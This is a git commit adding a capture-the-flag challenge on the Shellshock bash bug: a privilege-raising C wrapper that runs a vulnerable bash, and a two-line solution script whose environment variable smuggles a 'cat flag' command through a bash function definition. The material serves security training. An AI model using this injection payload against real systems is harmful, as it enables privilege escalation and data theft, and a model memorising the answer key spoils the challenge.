268af7fd2ca3f957e3530f4a949548d4846549ea
snix0 <ayfeng@uci.edu>
2021-06-07 01:35:21 -0400

    Add shellshock

---
+++ shellshock/shellshock.c
@@ -0,0 +1,11 @@
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main(){
+        setresuid(getegid(), getegid(), getegid());
+        setresgid(getegid(), getegid(), getegid());
+        system("/home/shellshock/bash -c 'echo shock_me'");
+        return 0;
+}
+
---
+++ shellshock/solution.sh
@@ -0,0 +1,2 @@
+export pwn='() { :; }; cat flag'
+./shellshock
